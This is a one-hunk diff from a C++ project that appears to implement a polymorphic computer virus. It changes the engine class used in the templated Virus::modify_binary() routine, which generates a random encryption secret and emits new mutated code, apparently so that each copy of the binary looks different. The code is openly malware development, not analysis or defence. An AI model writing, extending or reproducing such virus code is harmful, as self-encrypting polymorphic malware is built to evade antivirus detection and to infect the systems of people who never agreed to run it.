@@ -226,7 +226,7 @@ namespace poly {
               class Editor, class Compiler>
     void Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor,
                Compiler>::modify_binary() noexcept {
-        PolymorphicEngine<Cipher, Compiler, Editor> engine{*this->editor_};
+        OsPolymorphicEngine<Cipher, Compiler, Editor> engine{*this->editor_};
         auto secret = RandomGenerator::get_generator()
                           .get_random<EncryptionSecret<kByteWordSize>>();
         engine.generate_code(secret);
